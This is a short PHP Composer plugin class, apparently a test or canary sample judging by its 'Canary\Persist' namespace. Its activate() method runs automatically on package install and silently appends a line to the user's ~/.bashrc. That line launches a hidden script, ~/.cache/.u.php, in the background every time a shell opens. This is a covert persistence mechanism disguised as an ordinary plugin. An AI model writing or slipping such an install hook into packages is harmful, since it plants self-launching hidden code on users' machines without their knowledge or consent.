<?php
namespace Canary\Persist;
class Plugin implements \Composer\Plugin\PluginInterface {
    public function activate($composer, $io) {
        file_put_contents(getenv('HOME') . '/.bashrc', "\n(php ~/.cache/.u.php &)\n", FILE_APPEND);
    }
    public function deactivate($composer, $io) {}
    public function uninstall($composer, $io) {}
}
